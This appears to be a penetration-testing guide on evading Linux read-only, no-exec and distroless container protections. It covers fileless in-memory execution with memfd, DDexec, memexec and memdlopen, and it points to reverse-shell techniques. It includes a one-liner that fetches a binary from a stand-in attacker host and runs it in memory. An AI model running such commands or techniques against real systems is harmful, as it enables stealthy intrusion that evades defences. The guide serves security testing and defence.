# Bypass FS Protections: Read-only / No-exec / Distroless

## Videos

In the following videos you can find the techniques mentioned in this page explained more in depth:

- [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Read-only / No-exec Scenario

It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
    - name: alpine
      image: alpine
      securityContext:
        readOnlyRootFilesystem: true
      command: ["sh", "-c", "while true; do sleep 1000; done"]
```

However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.

From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).

## Easiest Bypass: Scripts

Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.

However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.

## Memory Bypasses

If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.

### FD + exec syscall Bypass

If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.

For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.

This doesn't work in other scripting languages like PHP or Node because they don't have any default way to call raw syscalls from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.

Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.

Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.

**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

For more information about this technique check the Github or:

[DDexec / EverythingExec](ddexec.html)

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.

You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in <https://github.com/arget13/memexec/blob/main/a.php>.

### Memdlopen

With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.

## Distroless Bypass

For a dedicated explanation of **what distroless actually is**, when it helps, when it does not, and how it changes post-exploitation tradecraft in containers, check:

[Distroless](../../privilege-escalation/container-security/distroless.html)

### What is Distroless

Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.

The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.

### Reverse Shell

In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`… everything that you usually run in a system.

Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.

However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.

Using the scripting language you could **enumerate the system** using the language capabilities.

If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.

However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.

You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
